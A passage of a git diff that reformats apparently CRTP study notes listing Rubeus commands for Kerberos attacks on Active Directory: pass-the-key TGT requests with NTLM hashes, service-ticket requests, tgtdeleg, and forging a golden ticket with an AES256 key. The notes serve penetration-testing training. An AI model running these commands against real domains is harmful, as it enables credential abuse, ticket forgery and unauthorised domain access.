@@ -470,11 +470,16 @@ Get tickets currently on System:
 
 #### Pass-the-key/Over-PTH
 Request ticket (TGT) based on username and password/hash:
-```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
+```
+Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
+```
+
 - [from previous section](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-overpasspass-the-key)
 
 Request Service ticket (TGS) based on Service Name:
-```rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab```
+```
+Rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab
+```
 
 #### Tgtdeleg
 Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
@@ -491,7 +496,9 @@ Hash of a user:
 ```rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1```
 
 Golden:
-```rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:FakeUser123 /printcmd```
+```
+rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:FakeUser123 /printcmd
+```
 
 Silver:
 ```
